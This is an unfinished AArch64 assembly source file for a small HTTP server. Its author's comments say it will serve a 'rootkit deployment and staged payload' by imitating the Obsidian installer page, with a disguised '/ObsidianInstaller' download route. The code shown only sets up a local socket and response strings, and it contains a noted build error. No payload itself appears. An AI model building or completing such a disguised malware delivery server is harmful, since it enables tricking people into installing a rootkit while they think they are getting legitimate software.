//////////////////////////////////////////////////////////////////////////
// Aarch64 ASM HTTP Server
// This is going to download our rootkit deployment and staged payload
// My objective is to mirror obsidian installer page as best as possible.
/////////////////////////////////////////////////////////////////////////
true: .word 1

// New Line
.align 4
newline: .ascii "\n"
// Index Route
.align 4
index_route: .ascii "GET /"
// Download Route (We are going to call it ObsidianMD)
.align 4
download_route: .ascii "GET /ObsidianInstaller"
// No Route 
.align 4
no_response_found:
    .ascii "HTTP/1.1 404 Not Found\n\r\nNot Found"
no_response_found = . - no_response_found
// Download Resource 
.align 4
ok_download_resource:
    .ascii "HTTP/1.1 200 OK\nContent-Type: application/octet-stream\n\r\n"
ok_download_resource = . - ok_download_resource

.data 

server_fd: .quad 0 // Server File Descriptor
client_fd: .quad 0 // Client File Descriptor 

.equ SOL_SOCKET, 0xffff // SOL_SOCKET
.equ SO_REUSERADDR, 0x4 // REUSEADDR
.equ buffer, 1024 // Buffer Size

sockaddr:
    .short 2 // AF_INET
    .short 0x1f90 // 8080
    .int 0x0100007f // Local Host
    .space 8 // Allocaed uninitialized bytes of memory, we are reserving here.

.text
.global _start
// exit program
exit:
    mov x0, #0
    mov x8, #93
    svc #0
// Quick and dirty
exit_error:
    mov x8, #57
    svc #0
    b exit 

_start:
    // Inititalize Socket
    mov x0, #2 
    mov x1, #1
    mov x2, #0
    mov x8, #198
    svc #0
    cmp x0, #0
    ble exit_error

    // Save server_fd to x3
    adrp x9, server_fd
    str x0, [x9, :lo12:server_fd]
    mov x3, x0

    // Allow Socket Reuse
    //  mains.s Error: unknown mnemonic 'ruse_opt' -- 'reuse_opt . int 1' 
    // This doesn't seem to be valid so I need to investigate and figure out
    // proper implementation
    mov x0, x3
    mov x1, #1
    mov x2, #2
    adrp x3, reuse_opt
    add x3, x3, :lo12:reuse_opt
    mov x4, #4
    mov x8, #208
    svc #0

    cmp x0, #0
    bne exit_error

    adrp x9, server_fd
    ldr x3, [x9, :lo12:server_fd]



